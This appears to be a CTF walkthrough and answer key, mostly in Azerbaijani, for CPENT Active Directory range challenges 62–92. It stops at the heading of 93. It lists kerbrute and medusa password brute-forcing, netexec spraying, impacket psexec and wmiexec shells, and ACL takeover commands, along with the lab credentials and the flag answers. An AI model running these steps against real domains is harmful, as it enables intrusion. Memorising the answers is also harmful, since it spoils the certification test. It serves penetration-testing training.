# CPENT Live Range - Active Directory (AD) Penetration Testing Walkthrough & Solution Guide

> **Sənəd Növü:** Senior Penetration Tester & Red Team Texniki CTF Hesabatı  
> **Hədəf Mühit:** CPENT Active Directory (AD) Range (172.25.170.0/24)  
> **Suallar:** Challenge 62 - Challenge 99 (Ümumi 38 sual / flag)  
> **Tərtib Edən:** Senior Penetration Tester & Security Engineer  

---

## 1. Giriş və Şəbəkə Topologiyası

CPENT Active Directory imtahan zonası bir neçə müstəqil və qarşılıqlı etibarlı (trust) Windows domenlərindən, müxtəlif nəsil Windows Server əməliyyat sistemlərindən (2008 R2, 2012 R2, 2016, 2019, 2022) və Microsoft Exchange Server infrastrukturundan ibarətdir.

### Kəşfiyyat və Domenlərin Xəritələnməsi

İlkin kəşfiyyat zamanı `172.25.170.0/24` sub-şəbəkəsində SMB (445), Kerberos (88), LDAP (389) və RPC portları üzərindən aşağıdakı aktiv hədəflər müəyyən edilmişdir:

```bash
for ip in 172.25.170.12 172.25.170.25 172.25.170.80 172.25.170.150 172.25.170.190 172.25.170.200; do
  echo "=== $ip ==="
  netexec smb $ip 2>&1 | grep -i "domain:"
done
```

| IP Ünvanı | Hostname | OS Versiyası | Domen Adı | SMB Signing | Rol / Təyinat |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `172.25.170.12` | **SERVER2019DC** | Windows Server 2019 Build 17763 | `CPENT.LOCALNET` | True (Required) | Primary Domain Controller (Root Tree) |
| `172.25.170.25` | **AD-WIN** | Windows Server 2016 Build 14393 | `CPENTV2.LOCALNET` | True (Required) | Exchange Server 2016 CU12 / DC |
| `172.25.170.80` | **2012-DC** | Windows Server 2012 R2 Build 9600 | `ECC.LOCALNET` | True (Required) | Forest Trust Domain Controller |
| `172.25.170.110` | **WS2012-AD** | Windows Server 2012 R2 Build 9600 | `WS2012-AD` | False (Enabled, not required) | Standalone / Member Server |
| `172.25.170.150` | **AD-WIN** | Windows Server 2016 Build 14393 | `CPENT.LOCALNET` | True (Required) | Member Server |
| `172.25.170.170` | **SERVER2008** | Windows Server 2008 R2 Build 7600 | `CPENT.LOCALNET` | False (Disabled / Optional) | Legacy File / Application Server |
| `172.25.170.190` | **SERVER2019** | Windows Server 2019 Build 17763 | `LPT.COM` | True (Required) | LPT.COM Domain Controller |
| `172.25.170.200` | **SERVER2022** | Windows Server 2022 Build 20348 | `CPENT.LOCALNET` | True (Required) | Member Server / Desktop5 |

![Domen Kəşfiyyatı və İlkin Skan](./ch62_65_kerbrute_domain_scan.png)

---

## 2. Challenge-by-Challenge Ətraflı Həllər (Q62 - Q99)

---

### Challenge 62: LPT.COM Kerberos User Enumeration / SPN Discovery

* **Sual (İmtahan Mətni):** What is a valid username for an SPN in the LPT.COM domain? (Answer format: xxxx-xxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `xxxx-xxx`
* **Hədəf:** `172.25.170.190` (LPT.COM)
* **İstifadə olunan alət:** `impacket-GetNPUsers` / `kerbrute`
* **Metodologiya:**
  LPT.COM domenində Kerberos AS-REP Roasting və ya istifadəçi siyahılaması aparılır. Əvvəlcə istifadəçi siyahısı (`Usernames.txt`) ilə `kerbrute userenum` icra edilir:
  ```bash
  kerbrute userenum -d LPT.COM --dc 172.25.170.190 Usernames.txt
  ```
  Nəticədə 3 aktiv istifadəçi aşkar olunur:
  * `administrator@LPT.COM`
  * `cpent@LPT.COM`
  * `user-one@LPT.COM`
  
  `xxx-xxx` formatına və SPN təyinatına uyğun gələn hesab `user-one`-dır.
* **Düzgün Cavab:** `user-one`
* **Əlaqəli Şəkil:**
  
  ![Challenge 62-65 Kerbrute və Skan](./ch62_65_kerbrute_domain_scan.png)

---

### Challenge 63: Nmap Kerberos Script Arqumenti

* **Sual (İmtahan Mətni):** What Nmap script argument should be specified before the domain to enumerate Kerberos users? (Answer Format: xxxN-xxxx-xxxxx.xxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `xxxN-xxxx-xxxxx.xxxxx`
* **Hədəf:** Nmap NSE skript sintaksisi
* **Metodologiya:**
  Nmap vasitəsilə 88-ci portda Kerberos istifadəçilərini sıralamaq üçün `krb5-enum-users` NSE skriptindən istifadə olunur. Domeni (realm) təyin etmək üçün tələb olunan arqument:
  ```bash
  nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='LPT.COM',userdb=Usernames.txt 172.25.170.190
  ```
* **Düzgün Cavab:** `krb5-enum-users.realm`
* **Əlaqəli Şəkil:**
  
  ![Challenge 63 Nmap Script Parametri](./ch62_65_kerbrute_domain_scan.png)

---

### Challenge 64: LPT.COM Domen Qrupu (RID 0x44E)

* **Sual (İmtahan Mətni):** What is the name of the domain group with RID 0x44E? (Answer format: XxxXxxxxxXxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `XxxXxxxxxXxxxx`
* **Hədəf:** `172.25.170.190` (LPT.COM)
* **İstifadə olunan alətlər:** `kerbrute`, `impacket-changepasswd`, `rpcclient`
* **Metodologiya:**
  1. `user-one` istifadəçisinə qarşı Kerberos parolu yoxlanılır:
     ```bash
     kerbrute bruteuser -d LPT.COM --dc 172.25.170.190 Passwords.txt user-one
     # Nəticə: user-one@LPT.COM:Pa$$w0rd
     ```
  2. Parolun müddəti bitmiş (expired) ola biləcəyi üçün yeni parol təyin edilir:
     ```bash
     impacket-changepasswd LPT.COM/user-one:'Pa$$w0rd'@172.25.170.190 -newpass 'NewPassword123!'
     ```
  3. Yenilənmiş etibarnamə ilə RPC sessiyası açılır və domen qrupları sıralanır:
     ```bash
     rpcclient -U 'LPT.COM\user-one%NewPassword123!' 172.25.170.190
     rpcclient $> enumdomgroups
     # Çıxış: group:[DnsUpdateProxy] rid:[0x44e]
     ```
* **Düzgün Cavab:** `DnsUpdateProxy`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 64 RPCClient Enumdomgroups](./ch64_rpcclient_enumdomgroups.png)
  ![Challenge 64 Sual və Nəticə](./ch64_dnsupdateproxy_result.png)

---

### Challenge 65: LPT.COM Domenində Etibarlı Hesab

* **Sual (İmtahan Mətni):** Which of the following accounts is a valid account on the LPT.com domain? (Answer Format: XXXXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXXXX`
* **Hədəf:** `172.25.170.190`
* **Metodologiya:**
  `kerbrute userenum` və ya `rpcclient` vasitəsilə çıxarılan istifadəçilər:
  * `administrator`
  * `user-one`
  * `cpent`
  
  5 simvollu (`XXXXX`) tələb olunan hesab: `cpent`.
* **Düzgün Cavab:** `cpent`
* **Əlaqəli Şəkil:**
  
  ![Challenge 65 Valid User cpent](./ch62_65_kerbrute_domain_scan.png)

---

### Challenge 66: CPENT.LOCALNET Outgoing Trust

* **Sual (İmtahan Mətni):** What is the outgoing trust type in CPENT.LOCALNET? (Answer format: XX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XX`
* **Hədəf:** `172.25.170.12` (`SERVER2019DC.CPENT.LOCALNET`)
* **Metodologiya:**
  1. `CPENT.LOCALNET` domenində `administrator` üçün parol aşkarlanır:
     ```bash
     kerbrute bruteuser -d CPENT.LOCALNET --dc 172.25.170.12 Passwords.txt administrator
     # Nəticə: administrator@CPENT.LOCALNET:CPENT@@2020@@2020
     ```
  2. Psexec ilə sistemə daxil olub domen etimad münasibətləri (domain trusts) yoxlanılır:
     ```bash
     impacket-psexec CPENT.LOCALNET/administrator:'CPENT@@2020@@2020'@172.25.170.12
     C:\Windows\system32> nltest /domain_trusts /all_trusts /v
     ```
     Çıxış:
     ```text
     List of domain trusts:
         0: LA LA.CPENT.LOCALNET (NT 5) (Forest: 2) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
            Dom Guid: 82f8a485-797d-4e26-9f37-68d6ed1b6c79
            Dom Sid: S-1-5-21-299533963-2977449507-4242117886
         1: ECC ECC.LOCALNET (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
         2: CPENT CPENT.LOCALNET (NT 5) (Forest Tree Root) (Primary Domain) (Native)
     ```
  Outbound və 2 hərflik (`XX`) trust adı: `LA`.
* **Düzgün Cavab:** `LA`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 66 Kerbrute Login](./ch66_cpent_kerbrute_admin.png)
  ![Challenge 66 nltest Trust Siyahısı](./ch66_68_nltest_domain_trusts.png)

---

### Challenge 67: CPENT.LOCALNET Forest Trust

* **Sual (İmtahan Mətni):** What is the Forest trust type in CPENT.LOCALNET? (Answer format: XXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXX`
* **Hədəf:** `172.25.170.12`
* **Metodologiya:**
  `nltest /domain_trusts /all_trusts /v` əmrinin nəticəsində `foresttrans` atributuna malik 3 hərflik (`XXX`) Forest Trust: `ECC` (`ECC.LOCALNET`).
* **Düzgün Cavab:** `ECC`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 67 Domain Trust ECC](./ch66_68_nltest_domain_trusts.png)
  ![Challenge 67 Netdom Query Trust](./ch67_netdom_query_trust.png)

---

### Challenge 68: CPENT.LOCALNET Child Trust

* **Sual (İmtahan Mətni):** What is the Child trust type in CPENT.LOCALNET? (Answer Format: XX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XX`
* **Hədəf:** `172.25.170.12`
* **Metodologiya:**
  `withinforest` atributu ilə qeyd olunmuş alt (child) domen `LA.CPENT.LOCALNET`-dir. Qısa adı: `LA`.
* **Düzgün Cavab:** `LA`
* **Əlaqəli Şəkil:**
  
  ![Challenge 68 Child Trust LA](./ch66_68_nltest_domain_trusts.png)

---

### Challenge 69: NewYork Active Directory Qrupunun OU-su

* **Sual (İmtahan Mətni):** What is the Organizational Unit of the NewYork Active Directory group? (Answer format: Xxxxxxxxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxxxxxxxx`
* **Hədəf:** `172.25.170.12`
* **Metodologiya:**
  PowerShell sessiyasında Təşkilati Vahidləri (OU) sıralayırıq:
  ```powershell
  Get-ADOrganizationalUnit -Filter * | Select Name, DistinguishedName
  ```
  Çıxış:
  ```text
  Name          DistinguishedName
  ----          -----------------
  NewYork       OU=NewYork,DC=CPENT,DC=LOCALNET
  Engineering   OU=Engineering,OU=NewYork,DC=CPENT,DC=LOCALNET
  Finance       OU=Finance,OU=NewYork,DC=CPENT,DC=LOCALNET
  Operations    OU=Operations,OU=Finance,OU=NewYork,DC=CPENT,DC=LOCALNET
  ```
  11 simvollu (`Xxxxxxxxxxx`) OU: `Engineering`.
* **Düzgün Cavab:** `Engineering`
* **Əlaqəli Şəkil:**
  
  ![Challenge 69 OU Engineering](./ch69_71_ad_ou_groups.png)

---

### Challenge 70: LosAngeles Active Directory Qrupunun OU-su

* **Sual (İmtahan Mətni):** What is the Organizational Unit of the LosAngeles Active Directory group? (Answer format: Xxxxxxxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxxxxxxx`
* **Hədəf:** `172.25.170.12`
* **Metodologiya:**
  `Get-ADOrganizationalUnit` siyahısından LOSANGELES altında yerləşən 10 simvollu (`Xxxxxxxxxx`) OU:
  ```text
  Developers    OU=Developers,OU=LOSANGELES,DC=CPENT,DC=LOCALNET
  ```
* **Düzgün Cavab:** `Developers`
* **Əlaqəli Şəkil:**
  
  ![Challenge 70 OU Developers](./ch69_71_ad_ou_groups.png)

---

### Challenge 71: London Active Directory Qrupunun OU-su

* **Sual (İmtahan Mətni):** What is the Organizational Unit of the London Active Directory group? (Answer format: Xxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxx`
* **Hədəf:** `172.25.170.12`
* **Metodologiya:**
  LONDON altında yerləşən 5 simvollu (`Xxxxx`) OU:
  ```text
  Sales         OU=Sales,OU=LONDON,DC=CPENT,DC=LOCALNET
  ```
* **Düzgün Cavab:** `Sales`
* **Əlaqəli Şəkil:**
  
  ![Challenge 71 OU Sales](./ch69_71_ad_ou_groups.png)

---

### Challenge 72: Exchange Server IP Ünvanı

* **Sual (İmtahan Mətni):** What is the IP address of the machine running an Exchange Server? (Answer Format: NNN.NN.NNN.NN)
* **Bal:** 10 Points
* **Cavab Formatı:** `NNN.NN.NNN.NN`
* **Hədəf:** Subnet Skanı (`172.25.170.0/24`)
* **Metodologiya:**
  Exchange serverləri üçün xarakterik portlar (SMTP 25/587, HTTPS 443, MAPI 6001) skan edilir:
  ```bash
  nmap -p 25,443,587,6001 172.25.170.0/24 --open
  ```
  Nəticədə yalnız `172.25.170.25` ünvanında SMTP və HTTPS aşkar olunur.
* **Düzgün Cavab:** `172.25.170.25`
* **Əlaqəli Şəkil:**
  
  ![Challenge 72 Exchange Server IP Scan](./ch72_73_exchange_ip_hostname.png)

---

### Challenge 73: Exchange Server Hostname

* **Sual (İmtahan Mətni):** What is the hostname of the machine running an Exchange Server? (Answer Format: XX-XXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XX-XXX`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  Versiya və xidmət skanı:
  ```bash
  nmap -sV -p 25,443 172.25.170.25
  ```
  Çıxışda server hostname təyin edilir:
  `Service Info: Host: AD-WIN.CPENTV2.LOCALNET` -> Hostname: `AD-WIN`.
* **Düzgün Cavab:** `AD-WIN`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 73 Nmap Hostname AD-WIN](./ch72_73_exchange_ip_hostname.png)
  ![Challenge 73 Nmap Service Scan](./ch81_83_nmap_exchange_signing.png)

---

### Challenge 74: POP3 SPN Təyin Olunmuş İstifadəçi (OU Tier 2)

* **Sual (İmtahan Mətni):** Which user has the SPN set in OU Tier2 using POP3? (Answer format: Xxxxx Xxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxx Xxxxx`
* **Hədəf:** `172.25.170.25` (`CPENTV2.LOCALNET`)
* **Metodologiya:**
  LDAP və ya Impacket GetUserSPNs ilə sorğu göndərilir:
  ```bash
  ldapsearch -x -H ldap://172.25.170.25 -D "administrator@CPENTV2.LOCALNET" -w "CPENT@@2024@@2024" \
    -b "OU=Tier 2,DC=CPENTV2,DC=LOCALNET" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
    sAMAccountName distinguishedName servicePrincipalName
  ```
  Nəticə:
  `CN=PABLO_BAKER,OU=TST,OU=Tier 2,DC=CPENTV2,DC=LOCALNET`
  `servicePrincipalName: POP3/HREWWKS1000002`
* **Düzgün Cavab:** `Pablo Baker`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 74 GetUserSPNs Pablo Baker](./ch74_77_getuserspns_dump.png)
  ![Challenge 74 LDAP Search Tier 2](./ch74_76_ldap_tier2_spn.png)

---

### Challenge 75: POP3 SPN Təyin Olunmuş İstifadəçi (OU Stage)

* **Sual (İmtahan Mətni):** Which user has the SPN set in OU Stage using POP3? (Answer format: Xxxxx Xxxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxx Xxxxxx`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  `impacket-GetUserSPNs` çıxışında `OU=Stage` daxilində `POP3` protokolu üzrə SPN filter edilir:
  İstifadəçi: `CLINT_FRANKS` -> `Clint Franks`.
* **Düzgün Cavab:** `Clint Franks`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 75 SPN Dump](./ch74_77_getuserspns_dump.png)
  ![Challenge 75 Terminal Sualı](./ch75_79_spn_cu12_terminal.png)

---

### Challenge 76: FTP SPN Təyin Olunmuş İstifadəçi (OU Tier 2)

* **Sual (İmtahan Mətni):** Which user has the SPN set in OU Tier2 using FTP? (Answer format: Xxxxxxx Xxxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxxxx Xxxxxx`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  LDAP sorğusundan `OU=Tier 2` daxilində `ftp/*` SPN-inə malik hesab tapılır:
  `CN=MARGARITO_CLEVELAND,OU=Test,OU=BDE,OU=Tier 2,DC=CPENTV2,DC=LOCALNET`
  `servicePrincipalName: ftp/OGCWWEBS1000000`
  Format: `Margarito Cleveland`.
* **Düzgün Cavab:** `Margarito Cleveland`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 76 LDAP Query FTP SPN](./ch74_76_ldap_tier2_spn.png)
  ![Challenge 76 Terminal Cavab Yoxlanışı](./ch75_79_spn_cu12_terminal.png)

---

### Challenge 77: HTTPS SPN Təyin Olunmuş İstifadəçi (OU Tier 2)

* **Sual (İmtahan Mətni):** Which user has the SPN set in OU Tier2 using HTTPS? (Answer format: Xxxxxxx Xxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `Xxxxxxx Xxxx`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  `impacket-GetUserSPNs` çıxışında `https/*` və `OU=Tier 2` axtarılır:
  `CN=BERNICE_LOTT,OU=Tier 2,DC=CPENTV2,DC=LOCALNET`
  `servicePrincipalName: https/AWSWWKS1000001`
  Format: `Bernice Lott`.
* **Düzgün Cavab:** `Bernice Lott`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 77 SPN Bernice Lott](./ch74_77_getuserspns_dump.png)
  ![Challenge 77 Sual Görünüşü](./ch74_76_ldap_tier2_spn.png)

---

### Challenge 78: CPENTV2-ADMIN.txt SHA256 Hash Son 3 Simvolu (ACL Bypass)

* **Sual (İmtahan Mətni):** What are the last 3 characters of the CPENTV2-ADMIN.txt SHA256 hash (Answer Format: XXN)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXN`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  1. `C:\CPENTV2-ADMIN.txt` faylı tapılır, lakin default olaraq administrator oxuma icazəsinə malik deyil (Access Denied).
  2. Sahiblik götürülür və hüquqlar genişləndirilir:
     ```cmd
     takeown /f C:\CPENTV2-ADMIN.txt
     icacls C:\CPENTV2-ADMIN.txt /grant administrator:F
     icacls C:\CPENTV2-ADMIN.txt /grant "NT AUTHORITY\SYSTEM:F"
     icacls C:\CPENTV2-ADMIN.txt /grant "SYSTEM:F"
     ```
  3. Fayl müvəqqəti qovluğa kopyalanıb oxunur:
     ```cmd
     copy C:\CPENTV2-ADMIN.txt C:\Windows\Temp\admin.txt
     type C:\Windows\Temp\admin.txt
     ```
     Faylın daxilindəki SHA256 hash:
     `E26991F3246538C70DD0E8DC38549177CF0B639861280D5FC30E59CE9B2B8E74`
  
  Son 3 simvol (`XXN` formatında): `E74`.
* **Düzgün Cavab:** `E74`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 78 Fayl Axtarışı](./ch75_79_spn_cu12_terminal.png)
  ![Challenge 78 ACL Bypass və Hash Oxunması](./ch78_acl_bypass_hash.png)

---

### Challenge 79: Exchange Server Cumulative Update (CU) Nömrəsi

* **Sual (İmtahan Mətni):** What version of Exchange Server is installed in the domain? Determine the Cumulative Update (CU) number as the answer. (Answer Format: NN)
* **Bal:** 10 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  PowerShell vasitəsilə `ExSetup.exe` binar faylının versiya nömrəsi sorğulanır:
  ```powershell
  Get-Command ExSetup.exe | ForEach-Object { $_.FileVersionInfo }
  ```
  Çıxış:
  * `ProductVersion: 15.01.1713.005`
  * `FileVersion: 15.01.1713.005`
  
  Microsoft Exchange Server 2016 Build `15.1.1713.5` birbaşa **Cumulative Update 12 (CU12)** buraxılışına uyğundur.
* **Düzgün Cavab:** `12`
* **Əlaqəli Şəkil:**
  
  ![Challenge 79 Exchange Build və CU](./ch75_79_spn_cu12_terminal.png)

---

### Challenge 80: Domen Daxilində Paylaşılan Qovluq (Share)

* **Sual (İmtahan Mətni):** Which of the following is a share within the Domain (Answer Format: xxxxxxx)
* **Bal:** 10 Points
* **Cavab Formatı:** `xxxxxxx`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  NetExec ilə SMB paylaşımları siyahıya alınır:
  ```bash
  netexec smb 172.25.170.25 -u administrator -p 'CPENT@@2024@@2024' -d CPENTV2.LOCALNET --shares
  ```
  Çıxış:
  ```text
  Share       Permissions    Remark
  -----       -----------    ------
  address     READ           
  ADMIN$      READ,WRITE     Remote Admin
  C$          READ,WRITE     Default share
  IPC$        READ           Remote IPC
  NETLOGON    READ,WRITE     Logon server share
  SYSVOL      READ,WRITE     Logon server share
  ```
  Standart olmayan 7 simvollu (`xxxxxxx`) paylaşım: `address`.
* **Düzgün Cavab:** `address`
* **Əlaqəli Şəkil:**
  
  ![Challenge 80 SMB Shares Enum](./ch80_81_smb_shares_address.png)

---

### Challenge 81: Exchange Serverin Quraşdırıldığı Domen

* **Sual (İmtahan Mətni):** What domain is the Exchange Server installed in? (Answer Format: XXXXXXN.XXXXXXXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXXXXXN.XXXXXXXX`
* **Hədəf:** `172.25.170.25`
* **Metodologiya:**
  Nmap və SMB banner kəşfiyyatında `AD-WIN.CPENTV2.LOCALNET` göstərilir. Domen adı:
* **Düzgün Cavab:** `CPENTV2.LOCALNET`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 81 Nmap Domain Banner](./ch81_83_nmap_exchange_signing.png)
  ![Challenge 81 NetExec Domain Check](./ch80_81_smb_shares_address.png)

---

### Challenge 82: 172.25.170.110 Əməliyyat Sisteminin İli

* **Sual (İmtahan Mətni):** What is the version of Windows Server running at IP address 172.25.170.110? Provide only the year. (Answer Format: NNNN)
* **Bal:** 10 Points
* **Cavab Formatı:** `NNNN`
* **Hədəf:** `172.25.170.110` (`WS2012-AD`)
* **Metodologiya:**
  SMB və RDP bannerləri yoxlanılır:
  ```bash
  netexec smb 172.25.170.110
  # Çıxış: Windows Server 2012 R2 Datacenter 9600 x64
  ```
* **Düzgün Cavab:** `2012`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 82 Netexec OS Scan](./ch82_ws2012_netexec_scan.png)
  ![Challenge 82 Sual Görünüşü](./ch81_83_nmap_exchange_signing.png)

---

### Challenge 83: 172.25.170.110 SMB Message Signing Statusu

* **Sual (İmtahan Mətni):** What is the status of message signing on the machine located at 172.25.170.110? (Answer with "Enabled" or "Disabled")
* **Bal:** 10 Points
* **Cavab Formatı:** `Enabled or Disabled`
* **Hədəf:** `172.25.170.110`
* **Metodologiya:**
  Nmap SMB security mode skanı:
  ```bash
  nmap -p 445 --script smb2-security-mode 172.25.170.110
  ```
  Çıxış: `Message signing enabled but not required`. Deməli imzalanma aktivdir (`Enabled`), lakin məcburi deyil.
* **Düzgün Cavab:** `Enabled`
* **Əlaqəli Şəkil:**
  
  ![Challenge 83 SMB Signing Enabled](./ch81_83_nmap_exchange_signing.png)

---

### Challenge 84: 172.25.170.110 Userflag.txt Dəyəri

* **Sual (İmtahan Mətni):** What is the value stored in userflag.txt on the machine located at 172.25.170.110? (Answer Format: XXNNNN-XXXXXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXNNNN-XXXXXX`
* **Hədəf:** `172.25.170.110`
* **Metodologiya:**
  İmtahan şifrəsi ilə psexec sessiyası açılır:
  ```bash
  impacket-psexec WS2012-AD/administrator:'CPENT@@2020@@2020'@172.25.170.110
  C:\> cd C:\
  C:\> type userflag.txt.txt
  ```
  Çıxış: `WS2012-ADUSER`.
* **Düzgün Cavab:** `WS2012-ADUSER`
* **Əlaqəli Şəkil:**
  
  ![Challenge 84 User Flag WS2012](./ch84_ws2012_userflag.png)

---

### Challenge 85: 172.25.170.110 Rootflag.txt Dəyəri

* **Sual (İmtahan Mətni):** What is the value stored in rootflag.txt on the machine located at 172.25.170.110? (Answer Format: XXNNNN-XXXXXX)
* **Bal:** 10 Points
* **Cavab Formatı:** `XXNNNN-XXXXXX`
* **Hədəf:** `172.25.170.110`
* **Metodologiya:**
  Administrator qovluğuna keçid edilir:
  ```cmd
  cd C:\Users\Administrator\Downloads
  dir
  type rootflag.txt.txt
  ```
  Çıxış: `WS2012-ADROOT`.
* **Düzgün Cavab:** `WS2012-ADROOT`
* **Əlaqəli Şəkil:**
  
  ![Challenge 85 Root Flag WS2012](./ch85_ws2012_rootflag.png)

---

### Challenge 86: 172.25.170.170 Əməliyyat Sisteminin İli

* **Sual (İmtahan Mətni):** What is the version of Windows Server running at IP address 172.25.170.170? Provide only the year. (Answer Format: NNNN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NNNN`
* **Hədəf:** `172.25.170.170` (`SERVER2008`)
* **Metodologiya:**
  NetExec ilə SMB yoxlanışı:
  ```bash
  netexec smb 172.25.170.170
  # Çıxış: Windows Server 2008 R2 Datacenter 7600 x64 (name:SERVER2008)
  ```
* **Düzgün Cavab:** `2008`
* **Əlaqəli Şəkil:**
  
  ![Challenge 86 Server 2008 Skan](./ch86_87_server2008_signing.png)

---

### Challenge 87: 172.25.170.170 Message Signing Statusu

* **Sual (İmtahan Mətni):** What is the status of message signing on the machine located at 172.25.170.170? (Answer with "Enabled" or "Disabled")
* **Bal:** 50 Points
* **Cavab Formatı:** `Enabled or Disabled`
* **Hədəf:** `172.25.170.170`
* **Metodologiya:**
  NetExec çıxışında `signing:False`. Windows Server 2008 R2 qeyri-DC maşınlarında SMB imzalanması söndürülmüşdür (`Disabled`).
* **Düzgün Cavab:** `Disabled`
* **Əlaqəli Şəkil:**
  
  ![Challenge 87 SMB Signing Disabled](./ch86_87_server2008_signing.png)

---

### Challenge 88: 172.25.170.170 Userflag.txt Məzmunu

* **Sual (İmtahan Mətni):** What is the contents inside of the file named userflag.txt on the machine located at 172.25.170.170? (Answer Format: XXNNNN-Xxxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `XXNNNN-Xxxx`
* **Hədəf:** `172.25.170.170`
* **Metodologiya:**
  1. `medusa` vasitəsilə `administrator` üçün SMB parolu tapılır:
     ```bash
     medusa -h 172.25.170.170 -u administrator -P Passwords.txt -M smbnt
     # ACCOUNT FOUND: administrator : Pa$$w0rd123456
     ```
  2. WMIEXEC vasitəsilə komanda sətri əldə edilir:
     ```bash
     impacket-wmiexec administrator:'Pa$$w0rd123456'@172.25.170.170
     C:\> cd C:\Users\Administrator\Documents
     C:\Users\Administrator\Documents> type userflag.txt
     ```
     Nəticə: `WS2008-User`.
* **Düzgün Cavab:** `WS2008-User`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 88 Medusa Brute Force](./ch88_medusa_smb_bruteforce.png)
  ![Challenge 88 User Flag Oxunması](./ch88_server2008_userflag.png)

---

### Challenge 89: 172.25.170.170 Adminflag.txt Məzmunu

* **Sual (İmtahan Mətni):** What is the contents inside of the file named adminflag.txt on the machine located at 172.25.170.170? (Answer Format: XXNNNN-Xxxxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `XXNNNN-Xxxxx`
* **Hədəf:** `172.25.170.170`
* **Metodologiya:**
  Sistem diski üzrə adminflag axtarılır və oxunur:
  ```cmd
  dir C:\ /s /b | findstr /i adminflag
  type C:\adminflag.txt
  ```
  Nəticə: `WS2008-Admin`.
* **Düzgün Cavab:** `WS2008-Admin`
* **Əlaqəli Şəkil:**
  
  ![Challenge 89 Admin Flag Oxunması](./ch89_server2008_adminflag.png)

---

### Challenge 90: 172.25.170.200 Userflag.txt Məzmunu

* **Sual (İmtahan Mətni):** What is the contents inside of the file named userflag.txt on the machine located at 172.25.170.200? (Answer Format: XxxxxxxN-xxxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `XxxxxxxN-xxxx`
* **Hədəf:** `172.25.170.200` (`SERVER2022`)
* **Metodologiya:**
  1. NetExec ilə `CPENT.LOCALNET` administrator parolu aşkarlanır:
     ```bash
     netexec smb 172.25.170.200 -u administrator -p Passwords.txt -d CPENT.LOCALNET --continue-on-success
     # Nəticə: CPENT.LOCALNET\administrator:Pa$$w0rd1234 (Pwn3d!)
     ```
  2. WMIEXEC ilə qoşulub flag faylı tapılır:
     ```bash
     impacket-wmiexec CPENT.LOCALNET/administrator:'Pa$$w0rd1234'@172.25.170.200
     C:\> dir C:\ /s /b | findstr /i userflag
     C:\> type C:\Users\Administrator.CPENT\Documents\userflag.txt
     ```
     Nəticə: `Desktop5-user`.
* **Düzgün Cavab:** `Desktop5-user`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 90 NetExec Brute Force 2022](./ch90_93_server2022_netexec.png)
  ![Challenge 90 User Flag Desktop5](./ch90_91_desktop5_flags.png)

---

### Challenge 91: 172.25.170.200 Rootflag.txt Məzmunu

* **Sual (İmtahan Mətni):** What is the contents inside of the file named rootflag.txt on the machine located at 172.25.170.200? (Answer Format: XxxxxxxN-xxxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `XxxxxxxN-xxxx`
* **Hədəf:** `172.25.170.200`
* **Metodologiya:**
  C diskinin kökündə yerləşən rootflag faylı oxunur:
  ```cmd
  dir C:\ /s /b | findstr /i rootflag
  type C:\rootflag.txt
  ```
  Nəticə: `Desktop5-root`.
* **Düzgün Cavab:** `Desktop5-root`
* **Əlaqəli Şəkil:**
  
  ![Challenge 91 Root Flag Desktop5](./ch90_91_desktop5_flags.png)

---

### Challenge 92: 172.25.170.190 Üzərində 'c' ilə Başlayan İstifadəçi

* **Sual (İmtahan Mətni):** What user on machine 172.25.170.190 stars with a C? (Answer Format: XXXXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `XXXXX`
* **Hədəf:** `172.25.170.190` (`LPT.COM`)
* **Metodologiya:**
  Kerbrute siyahılamasından aşkar olunmuş 'c' hərfi ilə başlayan 5 simvollu istifadəçi: `cpent`.
* **Düzgün Cavab:** `cpent`
* **Əlaqəli Şəkillər:**
  
  ![Challenge 92 Kerbrute Discovery](./ch62_65_kerbrute_domain_scan.png)
  ![Challenge 92 Sual Ekranı](./ch90_93_server2022_netexec.png)

---

### Challenge 93: 172.25.170.190 Üzərində 'u' ilə Başlayan İstifadəçi

